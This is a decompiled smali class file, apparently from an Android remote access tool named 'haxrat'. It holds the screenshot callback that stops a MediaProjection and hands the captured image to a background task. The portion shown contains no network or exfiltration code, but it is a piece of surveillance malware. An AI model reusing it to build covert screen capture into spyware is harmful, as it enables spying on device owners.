.class Lcom/hax4us/haxrat/Screenshot$100000001;
.super Ljava/lang/Object;
.source "Screenshot.java"

# interfaces
.implements Landroid/media/ImageReader$OnImageAvailableListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/Screenshot;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation

.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/Screenshot$100000001$100000000;
    }
.end annotation


# instance fields
.field private final this$0:Lcom/hax4us/haxrat/Screenshot;

.field private final val$height:I

.field private final val$mediaProjection:Landroid/media/projection/MediaProjection;

.field private final val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

.field private final val$width:I

.field private final val$windowSize:Landroid/graphics/Point;


# direct methods
.method constructor <init>(Lcom/hax4us/haxrat/Screenshot;Landroid/media/projection/MediaProjection;IILandroid/graphics/Point;Landroid/hardware/display/VirtualDisplay;)V
    .locals 10

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move v4, p4

    move-object v5, p5

    move-object/from16 v6, p6

    move-object v8, v0

    invoke-direct {v8}, Ljava/lang/Object;-><init>()V

    move-object v8, v0

    move-object v9, v1

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->this$0:Lcom/hax4us/haxrat/Screenshot;

    move-object v8, v0

    move-object v9, v2

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$mediaProjection:Landroid/media/projection/MediaProjection;

    move-object v8, v0

    move v9, v3

    iput v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$width:I

    move-object v8, v0

    move v9, v4

    iput v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$height:I

    move-object v8, v0

    move-object v9, v5

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$windowSize:Landroid/graphics/Point;

    move-object v8, v0

    move-object v9, v6

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    return-void
.end method

.method static access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001;->this$0:Lcom/hax4us/haxrat/Screenshot;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onImageAvailable(Landroid/media/ImageReader;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/media/ImageReader;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 87
    move-object v0, p0

    move-object v1, p1

    const-string v3, "AppLog"

    const-string v4, "onImageAvailable"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    .line 88
    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001;->val$mediaProjection:Landroid/media/projection/MediaProjection;

    invoke-virtual {v3}, Landroid/media/projection/MediaProjection;->stop()V

    .line 89
    new-instance v3, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;

    move-object v11, v3

    move-object v3, v11

    move-object v4, v11

    move-object v5, v0

    move-object v6, v1

    move-object v7, v0

    iget v7, v7, Lcom/hax4us/haxrat/Screenshot$100000001;->val$width:I

    move-object v8, v0

    iget v8, v8, Lcom/hax4us/haxrat/Screenshot$100000001;->val$height:I

    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/Screenshot$100000001;->val$windowSize:Landroid/graphics/Point;

    move-object v10, v0

    iget-object v10, v10, Lcom/hax4us/haxrat/Screenshot$100000001;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-direct/range {v4 .. v10}, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;-><init>(Lcom/hax4us/haxrat/Screenshot$100000001;Landroid/media/ImageReader;IILandroid/graphics/Point;Landroid/hardware/display/VirtualDisplay;)V

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Void;

    invoke-virtual {v3, v4}, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v3

    return-void
.end method
